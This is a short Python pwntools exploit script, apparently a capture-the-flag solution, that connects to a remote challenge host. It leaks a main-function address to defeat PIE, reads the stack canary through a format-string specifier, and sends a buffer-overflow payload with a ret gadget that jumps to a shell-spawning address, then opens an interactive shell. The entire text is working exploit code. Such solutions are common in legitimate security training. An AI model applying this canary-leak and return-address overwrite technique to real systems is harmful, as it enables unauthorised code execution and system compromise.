from pwn import *
p = remote('gz.imxbt.cn',20928)

p.recvuntil(b'give you a gift!!!!')

main_addr = int(p.recv(),16)

pie_base = main_addr - 0x000000000000124E                              #main实际地址  -  main函数附件地址

bin_sh = 0x0000000000001234                                                 #bin/sh附件地址

bin_sh_addr = pie_base + bin_sh

p.sendline(b'%11$lx')
canary = int(p.recv(),16)

ret = pie_base + 0x101a


payload = b'a'*(0x30-8) + p64(canary) + b'a'*(0x8) + p64(ret) + p64(bin_sh_addr)
p.send(payload)
p.interactive()